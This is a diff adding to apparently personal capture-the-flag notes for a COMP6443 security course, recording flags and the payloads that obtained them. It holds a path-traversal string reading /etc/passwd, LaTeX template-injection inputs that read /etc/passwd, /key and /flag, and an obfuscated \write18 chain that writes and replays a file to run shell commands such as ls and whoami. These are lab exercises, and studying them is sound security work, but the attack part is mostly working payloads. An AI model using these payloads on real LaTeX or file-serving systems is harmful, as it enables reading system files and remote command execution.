@@ -7,3 +7,55 @@ the file from a relative path to the current directory
 /../../../../../etc/passwd
 spits out the flag
 COMP6443{BRAAAAAINS}
+
+
+
+#letters
+latex template injection
+\input{/etc/passwd}
+
+\input{/key} 
+gave this:
+imagineUsingW0rd
+
+\input{/flag}
+COMP6443{IWonderWhatThatDebugOptionIsFor}
+
+flag 2
+#create a file cmd.tex which has lines of latex code
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello World}
+\closeout\outfile
+
+#run the lines of code line for line
+\def \imm {\string\imme}
+\def \diate {diate}
+\def \eighteen {\string18}
+\def \wwrite {\string\write\eighteen}
+\def \args {\string{ls challenges/week4/letters | base64> /tmp/output.tex\string}}
+\def \inp {\string\in}
+\def \iput {put}
+\def \cmd {\string{/tmp/output.tex\string}}
+
+
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{\imm\diate\wwrite\args}
+\write\outfile{\inp\iput\cmd}
+\closeout\outfile
+
+
+\newread\file
+\openin\file=cmd.tex
+\loop\unless\ifeof\file
+    \read\file to\fileline 
+    \fileline
+\repeat
+\closein\file
+
+#commands I used and the results
+ls | base64     <--- base64 avoids bad charas
+whoami  <-- letters 
+
+
